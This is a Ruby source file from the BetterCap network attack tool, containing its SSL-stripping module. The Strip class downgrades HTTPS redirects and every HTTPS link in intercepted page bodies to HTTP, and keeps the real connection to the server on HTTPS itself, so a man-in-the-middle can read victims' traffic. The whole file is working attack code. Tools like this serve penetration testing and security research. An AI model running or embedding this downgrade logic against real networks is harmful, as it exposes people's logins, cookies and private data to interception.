=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

module BetterCap
module Proxy
module SSLStrip

# Handle SSL stripping.
class Strip
  # Maximum number of redirects to detect a HTTPS redirect loop.
  MAX_REDIRECTS = 3
  # Regular expression used to parse HTTPS urls.
  HTTPS_URL_RE = /(https:\/\/[^"'\/]+)/i

  # Create an instance of this object.
  def initialize
    @monitor = URLMonitor.new
  end

  # Check if the +request+ is a result of a stripped link/redirect.
  def preprocess( request )
    link = @monitor.normalize( request.host )
    if request.port == 80 and @monitor.was_stripped?( request.client, link )
      Logger.debug "[#{'SSLSTRIP'.green} #{request.client}] Found stripped HTTPS link '#{link}', proxying via SSL."
      request.port = 443
    end
  end

  # Process the +request+ and if it's a redirect to a HTTPS url patch the
  # Location header and retry.
  # Process the +response+ and replace every https link in its body with
  # http counterparts.
  def process( request, response )
    # check for a redirect
    if response['Location'].start_with?('https://')
      link = @monitor.normalize( response['Location'] )
      Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Found redirect to HTTPS '#{link}'."
      @monitor.add!( request.client, link )

      # The request will be retried on port 443 if MAX_REDIRECTS is not reached.
      request.port = 443
      # If MAX_REDIRECTS is reached, the 'Location' header will be used.
      response['Location'] = @monitor.downgrade( response['Location'] )

      # retry the request if possible
      return true
    end

    # parse body
    response.body.scan( HTTPS_URL_RE ).uniq.each do |link|
      if link[0].include?('.')
        link       = @monitor.normalize( link[0] )
        downgraded = @monitor.downgrade( link )
        Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Found HTTPS link '#{link}' -> '#{downgraded}'."

        @monitor.add!( request.client, link )
        response.body.gsub!( link, downgraded )
      end
    end

    # do not retry the request.
    false
  end
end

end
end
end
